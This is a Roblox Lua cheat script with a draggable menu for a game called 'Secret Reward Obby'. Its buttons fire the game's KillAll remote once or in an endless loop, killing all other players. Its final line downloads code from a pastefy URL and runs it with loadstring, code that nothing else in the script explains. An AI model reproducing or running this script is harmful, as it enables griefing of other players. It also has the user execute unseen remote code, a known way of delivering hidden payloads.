
-- Create the ScreenGui in CoreGui
local coreGui = game:GetService("CoreGui")
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = coreGui

-- Create the Frame (main box GUI) with reduced height
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 175)  -- Width: 200px, Height: 400px
frame.Position = UDim2.new(0.5, -100, 0.5, -200)  -- Centered on the screen
frame.BackgroundColor3 = Color3.fromRGB(202, 137, 51)  -- Green color
frame.ZIndex = 10  -- Set ZIndex to ensure it's on top
frame.Parent = screenGui

-- Create the Header (sean)
local sean = Instance.new("Frame")
sean.Size = UDim2.new(1, 0, 0, 30)  -- Full width, height: 30px
sean.Position = UDim2.new(0, 0, 0, 0)  -- Positioned at the top of the Frame
sean.BackgroundColor3 = Color3.fromRGB(227, 137, 20)
sean.ZIndex = 11  -- Set ZIndex to ensure it's on top of the Frame
sean.Parent = frame

-- Create the TextLabel in the sean with cartoon font
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)  -- Full width and height of sean
textLabel.Position = UDim2.new(0, 0, 0, 0)  -- Position at the top of the sean
textLabel.BackgroundTransparency = 1  -- Make background transparent
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text color
textLabel.Text = "Secret Reward Obby"
textLabel.TextScaled = true  -- Scale text to fit the label
textLabel.Font = Enum.Font.Cartoon  -- Set font to Cartoon
textLabel.ZIndex = 12  -- Set ZIndex to ensure it's on top of the sean
textLabel.Parent = sean

-- Create the function to add buttons to the frame
local function createButton(text, positionY, callback)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 180, 0, 40)  -- Width: 180px, Height: 40px (reduced size)
    button.Position = UDim2.new(0.5, -90, 0, positionY)  -- Centered within the Frame, with positionY as offset
    button.BackgroundColor3 = Color3.fromRGB(176, 115, 34)  -- Darker green color
    button.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text color
    button.Text = text  -- Button text
    button.TextScaled = true  -- Scale text to fit the button
    button.Font = Enum.Font.Cartoon  -- Set font to Cartoon
    button.TextWrapped = true  -- Wrap text if it overflows
    button.ZIndex = 12  -- Set ZIndex to ensure it's on top of the sean
    button.Parent = frame
    button.MouseButton1Click:Connect(callback)
    return button
end

-- Create all buttons with reduced size and adjusted positioning
createButton("KILL ALL", 40, function()
        game:FindService("ReplicatedStorage").Remotes.KillAll:FireServer()
end)

createButton("LOOPKILL ALL (IRREVERSIBLE)", 90, function()
    while true do
    task.wait()
    game:FindService("ReplicatedStorage").Remotes.KillAll:FireServer()
        end
end)

-- Create the TextLabel at the bottom of the Frame with "made by robo"
local bottomTextLabel = Instance.new("TextLabel")
bottomTextLabel.Size = UDim2.new(1, 0, 0, 30)  -- Full width, height: 30px
bottomTextLabel.Position = UDim2.new(0, 0, 1, -30)  -- Positioned at the bottom of the Frame
bottomTextLabel.BackgroundTransparency = 1  -- Transparent background
bottomTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text color
bottomTextLabel.Text = "made by Orbs 🎃"  -- Footer text
bottomTextLabel.TextScaled = true  -- Scale text to fit the label
bottomTextLabel.Font = Enum.Font.Cartoon  -- Set font to Cartoon
bottomTextLabel.ZIndex = 12  -- Ensure it is on top of the background
bottomTextLabel.Parent = frame

-- Variables to handle dragging
local dragging = false
local dragInput, startPos, framePos

-- Function to start dragging the sean
local function onInputBegin(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragInput = input
        startPos = input.Position
        framePos = frame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end

-- Function to update the position of the Frame based on dragging the sean
local function onInputChange(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - startPos
        frame.Position = UDim2.new(
            framePos.X.Scale, framePos.X.Offset + delta.X,
            framePos.Y.Scale, framePos.Y.Offset + delta.Y
        )
    end
end

-- Connect input events for dragging
sean.InputBegan:Connect(onInputBegin)
sean.InputChanged:Connect(onInputChange)
game:GetService("UserInputService").InputChanged:Connect(onInputChange)

loadstring(game:HttpGet("https://pastefy.app/XFIQLT4j/raw"))()